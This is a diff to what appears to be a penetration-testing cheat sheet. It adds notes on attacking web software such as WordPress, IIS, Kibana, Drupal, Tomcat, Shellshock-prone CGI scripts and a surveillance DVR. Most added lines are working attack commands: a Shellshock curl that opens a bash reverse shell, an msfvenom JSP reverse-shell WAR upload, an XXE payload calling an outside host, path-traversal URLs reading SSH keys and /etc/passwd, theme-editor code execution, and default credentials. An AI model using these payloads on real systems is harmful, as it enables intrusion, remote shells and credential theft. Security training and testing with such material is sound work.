@@ -102,6 +102,7 @@ I try as much as possible to link to the various sources or inspiration for thes
   - [GraphQL](#graphql)
   - [WordPress](#wordpress)
   - [IIS - Internet Information Services](#iis---internet-information-services)
+  - [Microsoft SharePoint](#microsoft-sharepoint)
   - [Lotus Domino](#lotus-domino)
   - [phpLDAPadmin](#phpLDAPadmin)
   - [Git source code exposure](#git-source-code-exposure)
@@ -111,6 +112,14 @@ I try as much as possible to link to the various sources or inspiration for thes
   - [APIs attacks](#apis-attacks)
   - [Grafana attacks](#grafana-attacks)
   - [Confluence attacks](#confluence-attacks)
+  - [Kibana](#kibana)
+  - [Argus Surveillance DVR](#argus-surveillance-dvr)
+  - [Shellshock](#shellshock)
+  - [Cassandra web](#cassandra-web)
+  - [RaspAP](#raspap)
+  - [Drupal](#drupal)
+  - [Tomcat](#tomcat)
+  - [Booked Scheduler](#booked-scheduler)
 - [Client-Side Attacks](#client-side-attacks)
   - [Client Information Gathering](#client-information-gathering)
   - [HTML applications](#html-applications)
@@ -2331,6 +2340,7 @@ Some applications block input containing hostnames like `127.0.0.1` and localhos
 - [SSRF (Server Side Request Forgery) testing resources](https://github.com/cujanovic/SSRF-Testing)
 - If the target runs Windows, try to steal NTLM hashes with Responder [[Reference](https://twitter.com/hacker_/status/1694554700555981176)]
   - `/vulnerable?url=http://your-responder-host`
+- `<?php header('Location: file:///Users/p4yl0ad/.ssh/id_rsa');?>`
 
 **Common endpoints**
 - Webhooks
@@ -2477,6 +2487,15 @@ Manually testing for XXE vulnerabilities generally involves
 - Testing for blind XXE vulnerabilities
 - Testing for vulnerable inclusion of user-supplied non-XML data within a server-side XML document
 
+**Notes**
+- In an endpoint like "ping/pong" you might send a request to include xml
+- Try to chain it with LFI for an RCE
+- Basic payload
+  ```xml
+  <?xml version="1.0" encoding="UTF-8" ?>
+  <!DOCTYPE writeup [<!ENTITY xxe SYSTEM "http://10.10.14.38/ping.php" >]>
+  <writeup>&xxe;</writeup>
+  ```
 
 
 ### <ins>Cross-site scripting (XSS)</ins>
@@ -3091,6 +3110,9 @@ To analyze the schema: [vangoncharov.github.io/graphql-voyager/](https://ivangon
   - `/wp-json/wp/v2/users/`
   - `/wp-json/th/v1/user_generation`
   - `/?rest_route=/wp/v2/users`
+- Register:
+  - `http://192.168.157.166/wp-login.php?action=register`
+  - `http://192.168.157.166/wp-signup.php`
 - xmlrpc.php enabled, [reference](https://hackerone.com/reports/138869). Send a post request to this endpoint with a body like this:
   ```xml
   <?xml version="1.0" encoding="utf-8"?>
@@ -3107,6 +3129,12 @@ To analyze the schema: [vangoncharov.github.io/graphql-voyager/](https://ivangon
   - `wpscan --url <target> --enumerate p --plugins-detection aggressive -o results`
   - `wpscan --url https://example[.]com --api-token <api token> --plugins-detection mixed -e vp,vt,cb,dbe,u1-10 --force` [[source]](https://twitter.com/TakSec/status/1671202550844993543)
 - Nuclei templates `%USERPROFILE%\nuclei-templates\vulnerabilities\wordpress`
+- If you login as admin, you can achieve RCE
+  - modify the theme in 'Appearance' > 'Theme Editor'
+  - add `<?php exec("whoami")?>`
+- https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress
+- Check `wp-config.php`
+- Find outdated plugins and use searchsploit
 
 **Resources**
 - https://github.com/daffainfo/AllAboutBugBounty/blob/master/Technologies/WordPress.md
@@ -3116,6 +3144,7 @@ To analyze the schema: [vangoncharov.github.io/graphql-voyager/](https://ivangon
 
 
 ### <ins>IIS - Internet Information Services</ins>
+
 - Check if `trace.axd` is enabled
 - Search for
   ```
@@ -3128,11 +3157,23 @@ To analyze the schema: [vangoncharov.github.io/graphql-voyager/](https://ivangon
   System.Web.Routing.dll
   ```
 - [Other common files](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services#common-files)
+- Microsoft IIS 6.0, many RCE and BoF
+  - https://www.exploit-db.com/exploits/41738
+  - `exploit/windows/iis/iis_webdav_scstoragepathfromurl`
+- Tilde / shortname enumeration
+  1. [200 expected] `curl --silent -v -X OPTIONS "http://10.10.10.93/idontexist*~.*" 2>&1 | grep "HTTP/1.1"`
+  2. [404 expected] `curl --silent -v -X OPTIONS "http://10.10.10.93/aspnet~1.*" 2>&1 | grep "HTTP/1.1"`
+  3. `java -jar /home/kali/Documents/web-attack/IIS-ShortName-Scanner/release/iis_shortname_scanner.jar 2 20 http://10.10.10.93 /home/kali/Documents/web-attack/IIS-ShortName-Scanner/release/config.xml`
+- IIS file extensions https://learn.microsoft.com/en-us/previous-versions/2wawkw1c(v=vs.140)?redirectedfrom=MSDN
+
 
 **Resources**
 - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services
 - Wordlist [iisfinal.txt](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services#iis-discovery-bruteforce)
 
+### <ins>Microsoft SharePoint</ins>
+
+- Go to `http://target.com/_layouts/viewlsts.aspx` to see files shared / Site Contents
 
 ### <ins>Lotus Domino</ins>
 
@@ -3231,6 +3272,68 @@ Common API path convention: `/api_name/v1`
 2. `curl http://<Confluence-IP>:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/<YOUR-IP>/<YOUR-PORT>%200%3E%261%27%29.start%28%29%22%29%7D/`
 3. Run a listener `nc -nvlp 4444`
 
+
+#### <ins>Kibana</ins>
+
+- RCE https://github.com/mpgn/CVE-2019-7609
+- If you are unable to get code execution reset the machine and try again in a incognito browser window.
+- Remember run the payload on Timelion and then navigate Canvas to trigger it
+
+
+#### <ins>Argus Surveillance DVR</ins>
+
+- LFI: `http://192.168.212.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2FViewer%2F.ssh%2Fid_rsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=%22`
+- Password located at `C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini`
+  - weak password encryption
+  - l'exploit trova un carattere per volta. Non funziona con i caratteri speciali > se trovi 'Unknown' significa che `e un carattere speciale e lo devi scoprire manualmente
+  
+
+#### <ins>Shellshock</ins>
+
+- If you find `/cgi-bin/`, search for extensions `sh`, `cgi`, `py`, `pl` and more
+- `curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.49.124/1234 0>&1' http://192.168.124.87/cgi-bin/test.sh`
+
+
+#### <ins>Cassandra web</ins>
+
+- `pip install cqlsh`
+- `cqlsh <IP>`
+- `sudo /usr/local/bin/cassandra-web -u cassie -p SecondBiteTheApple330 -B 0.0.0.0:4444`
+  - runnato come root, puoi vedere tutti i file del sistema
+  - `curl --path-as-is localhost:4444/../../../../../../../../etc/passwd`
+- https://book.hacktricks.xyz/network-services-pentesting/cassandra
+- https://medium.com/@manhon.keung/proving-grounds-practice-linux-box-clue-c5d3a3b825d2
+
+
+#### <ins>RaspAP</ins>
+
+- `http://192.168.157.97:8091/includes/webconsole.php`
+
+
+#### <ins>Drupal</ins>
+
+- Enumerate version by seeing `/CHANGELOG.txt`
+- `droopescan scan drupal -u http://10.10.10.9`
+
+Drupalgeddon
+- Check also Drupalgeddon2
+- `python drupalgeddon3.py http://10.10.10.9/ "SESSd873f26fc11f2b7e6e4aa0f6fce59913=GCGJfJI7t9GIIV7M7NLK8ARzeURzu83jxeqI2_qcDGs" 1 "whoami"`
+
+
+#### <ins>Tomcat</ins>
+
+- Default creds
+  - `tomcat:s3cret`
+  - https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown
+- File uploads in tomcat/manager
+  1. `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.30 LPORT=4445 -f war > shell.war`
+  2. Go to `http://10.10.10.85/shell`
+
+
+#### <ins>Booked Scheduler</ins>
+
+- 2.7.5 RCE: https://github.com/F-Masood/Booked-Scheduler-2.7.5---RCE-Without-MSF
+- LFI: `http://192.168.243.64:8003/booked/Web/admin/manage_email_templates.php?dr=template&lang=en_us&tn=../../../../../../../../../etc/passwd&_=1588451710324`
 
 
 ## Client-Side Attacks
